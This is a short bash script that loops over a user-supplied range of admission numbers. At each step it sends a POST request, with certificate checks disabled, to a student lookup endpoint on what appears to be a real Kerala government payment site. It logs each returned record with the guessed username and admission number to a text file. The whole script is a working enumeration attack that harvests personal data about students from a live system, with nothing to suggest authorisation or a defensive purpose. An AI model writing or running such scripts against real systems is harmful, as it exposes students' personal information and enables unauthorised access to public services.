 
 echo "Enter the Starting Range :"  
 read StartRange
 echo "Enter the Ending Range :"  
 read EndRange




for ((i = $StartRange ; i <= $EndRange ; i=i+100)) 
do

  curl -k -X POST -d  "username=pkd$i" https://digipay.dtekerala.gov.in/netbank/index.php/student/loadgetname_u >> text.txt
  
  
  echo >> text.txt
  echo "            Username : pkd$i" >> text.txt
  echo "            Admission NO  : $i" >> text.txt

  echo "  " >> text.txt

done
